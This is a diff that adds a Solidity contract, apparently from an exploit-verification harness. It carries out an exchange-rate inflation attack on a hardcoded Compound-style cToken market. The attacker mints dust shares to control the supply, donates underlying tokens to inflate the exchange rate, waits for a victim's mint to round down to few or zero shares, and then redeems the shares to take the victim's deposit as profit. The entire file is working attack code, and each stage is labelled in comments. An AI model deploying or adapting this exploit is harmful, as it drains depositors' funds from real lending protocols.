@@ -1,0 +1,199 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface ICTokenLike {
+    function underlying() external view returns (address);
+    function exchangeRateStored() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+    function getCash() external view returns (uint256);
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    uint256 internal constant EXP_SCALE = 1e18;
+    uint256 internal constant DOMINANCE_BPS = 9_990;
+
+    enum Stage {
+        Idle,
+        WaitingForVictimMint,
+        Withdrawn
+    }
+
+    Stage public stage;
+
+    address internal cachedUnderlying;
+    uint256 internal realizedProfit;
+
+    uint256 public baselineUnderlyingBalance;
+    uint256 public seededUnderlyingAmount;
+    uint256 public donatedUnderlyingAmount;
+    uint256 public attackerCTokenBalance;
+    uint256 public stagedCashAfterDonation;
+    uint256 public stagedExchangeRateAfterDonation;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        ICTokenLike market = ICTokenLike(TARGET);
+        IERC20Like underlyingToken = IERC20Like(_underlying());
+
+        if (stage == Stage.Idle) {
+            _seedThenDonate(market, underlyingToken);
+            return;
+        }
+
+        if (stage == Stage.WaitingForVictimMint) {
+            _withdrawAfterVictimMint(market, underlyingToken);
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        address underlying = cachedUnderlying;
+        if (underlying == address(0)) {
+            return ICTokenLike(TARGET).underlying();
+        }
+        return underlying;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfit;
+    }
+
+    function _seedThenDonate(ICTokenLike market, IERC20Like underlyingToken) internal {
+        baselineUnderlyingBalance = underlyingToken.balanceOf(address(this));
+
+        // Attempt strategy: direct_or_existing_balance_first.
+        // Without verifier-held underlying there is no honest way to seed the market or make the donation.
+        if (baselineUnderlyingBalance == 0) {
+            return;
+        }
+
+        uint256 exchangeRate = market.exchangeRateStored();
+        uint256 supplyBefore = market.totalSupply();
+        uint256 seedAmount;
+
+        if (supplyBefore == 0) {
+            // Exploit path 1: mint a dust amount into an empty market so the attacker owns the entire cToken supply.
+            seedAmount = _ceilDiv(exchangeRate, EXP_SCALE);
+        } else {
+            // Exploit path 1, thin-market variant: mint the minimum needed to control essentially all outstanding cTokens.
+            uint256 targetMintTokens = _ceilDiv(supplyBefore * DOMINANCE_BPS, 10_000 - DOMINANCE_BPS);
+            seedAmount = _ceilDiv(targetMintTokens * exchangeRate, EXP_SCALE);
+        }
+
+        // The exploit requires both the initial mint and a later direct donation.
+        if (seedAmount == 0 || seedAmount >= baselineUnderlyingBalance) {
+            return;
+        }
+
+        _forceApprove(underlyingToken, TARGET, seedAmount);
+
+        // Path anchor: external mint() call.
+        if (market.mint(seedAmount) != 0) {
+            return;
+        }
+
+        uint256 cTokenBalance = market.balanceOf(address(this));
+        uint256 supplyAfter = market.totalSupply();
+
+        if (cTokenBalance == 0 || cTokenBalance * 10_000 < supplyAfter * DOMINANCE_BPS) {
+            if (cTokenBalance != 0) {
+                market.redeem(cTokenBalance);
+            }
+            return;
+        }
+
+        uint256 donationAmount = underlyingToken.balanceOf(address(this));
+        if (donationAmount == 0) {
+            market.redeem(cTokenBalance);
+            return;
+        }
+
+        // Exploit path 2: donate underlying directly to the cToken contract.
+        // This increases getCashPrior() used by exchangeRateStoredInternal() without minting new cTokens.
+        _safeTransfer(underlyingToken, TARGET, donationAmount);
+
+        seededUnderlyingAmount = seedAmount;
+        donatedUnderlyingAmount = donationAmount;
+        attackerCTokenBalance = cTokenBalance;
+        stagedCashAfterDonation = market.getCash();
+        stagedExchangeRateAfterDonation = market.exchangeRateStored();
+
+        // Exploit path 3: the victim must later call mint(), which internally reaches mintFresh().
+        // mintFresh() computes:
+        //   mintTokens = actualMintAmount / exchangeRate
+        // using the donation-inflated exchange rate, so flooring can mint too few or zero shares.
+        stage = Stage.WaitingForVictimMint;
+    }
+
+    function _withdrawAfterVictimMint(ICTokenLike market, IERC20Like underlyingToken) internal {
+        uint256 cashNow = market.getCash();
+
+        // The victim mint()/mintFresh() step is only considered complete once market cash increased beyond the
+        // post-donation snapshot. This also covers the zero-share case, where totalSupply may stay unchanged.
+        if (cashNow <= stagedCashAfterDonation) {
+            return;
+        }
+
+        uint256 cTokenBalance = market.balanceOf(address(this));
+        if (cTokenBalance == 0) {
+            stage = Stage.Withdrawn;
+            return;
+        }
+
+        // Exploit path 4: attacker withdraws value by redeeming the cTokens acquired before the donation.
+        // The on-chain contract performs this withdrawal leg through redeem(), which is the market's cash-out path.
+        if (market.redeem(cTokenBalance) != 0) {
+            return;
+        }
+
+        uint256 finalUnderlyingBalance = underlyingToken.balanceOf(address(this));
+        if (finalUnderlyingBalance > baselineUnderlyingBalance) {
+            realizedProfit = finalUnderlyingBalance - baselineUnderlyingBalance;
+        }
+
+        attackerCTokenBalance = 0;
+        stage = Stage.Withdrawn;
+    }
+
+    function _underlying() internal returns (address underlying) {
+        underlying = cachedUnderlying;
+        if (underlying == address(0)) {
+            underlying = ICTokenLike(TARGET).underlying();
+            cachedUnderlying = underlying;
+        }
+    }
+
+    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
+        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
+    }
+
+    function _safeTransfer(IERC20Like token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(IERC20Like token, bytes memory data) internal {
+        (bool success, bytes memory returndata) = address(token).call(data);
+        require(success, "TOKEN_CALL_FAILED");
+        if (returndata.length != 0) {
+            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
+        }
+    }
+
+    function _ceilDiv(uint256 numerator, uint256 denominator) internal pure returns (uint256) {
+        if (numerator == 0) {
+            return 0;
+        }
+        return ((numerator - 1) / denominator) + 1;
+    }
+}
